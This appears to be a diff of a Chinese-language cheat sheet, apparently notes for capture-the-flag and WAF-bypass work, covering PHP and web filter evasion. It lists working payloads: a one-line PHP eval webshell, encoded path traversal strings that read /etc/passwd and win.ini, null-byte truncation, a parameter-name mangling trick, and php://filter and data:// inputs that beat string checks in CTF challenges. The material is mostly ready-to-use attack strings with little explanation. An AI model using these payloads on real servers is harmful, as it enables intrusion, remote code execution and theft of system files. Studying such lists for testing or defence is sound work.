@@ -15,31 +15,32 @@
 [实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
 [webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)
 
-| bypass           | payload                                               |     |
-| ---------------- | ----------------------------------------------------- | --- |
-| <?               | `<script language="php">@eval($_POST['1']);</script>` |     |
-| %2F 代替/        | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd            |     |
-| 二次编码(%25)    | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd    |
-| 加入+            | ?filename=.+./.+./bin/redacted.dll                    |
-| %00              | ?filename=.%00./file.php <br>/etc/passwd%00.jpg       |
-| \                | ?filename=..%5c..%5c/windows/win.ini                  |
-| is_numeric       | is_numeric ('0xFFFF') 16 进制绕过                     |
-| 反码绕           | urlencode(~'system');                                 |
-| xor bypass       | bypass_xorshell.py                                    |
-| php\|strstr      | 大小写绕过, strstri 才是大小写不敏感                  |
-| pathinfo         | `filename/.`可以绕过 见 php_bypass_pathinfo.py        |
-| ---              |
-| disable_function | 蚁剑插件                                              |
+| bypass             | payload                                               | 解释                                           |
+| ------------------ | ----------------------------------------------------- | ---------------------------------------------- |
+| <?                 | `<script language="php">@eval($_POST['1']);</script>` |                                                |
+| %2F 代替/          | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd            |                                                |
+| 二次编码(%25)      | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd    |
+| 加入+              | ?filename=.+./.+./bin/redacted.dll                    |
+| %00                | ?filename=.%00./file.php <br>/etc/passwd%00.jpg       |
+| \                  | ?filename=..%5c..%5c/windows/win.ini                  |
+| is_numeric         | is_numeric ('0xFFFF') 16 进制绕过                     |
+| 反码绕             | urlencode(~'system');                                 |
+| xor bypass         | bypass_xorshell.py                                    |
+| php\|strstr        | 大小写绕过, strstri 才是大小写不敏感                  |
+| pathinfo           | `filename/.`可以绕过 见 php_bypass_pathinfo.py        |
+| `$_POST['e_v.a.l]` | `?e[v.a.l=123`                                        | `空格、+、[`会转为`_`, 存在`[`时后面不会被替换 |
+| ---                |
+| disable_function   | 蚁剑插件                                              |
 
 ## bypass functions
 
 ## bypass detail
 
-### bypass filter_var($url, FILTER_VALIDATE_URL)
+### bypass `filter_var($url, FILTER_VALIDATE_URL)`
 
 `?url=http://`
 
-### bypass file_get_contents($text,'r')==="welcome to the zjctf"
+### bypass `file_get_contents($text,'r')==="welcome to the zjctf"`
 
 `?text=data://test/plain,welcome to the zjctf&file=php://filter/resource=useless.php`
 `?text=data://test/plain,I have a dream&file=php://filter/resource=next.php`
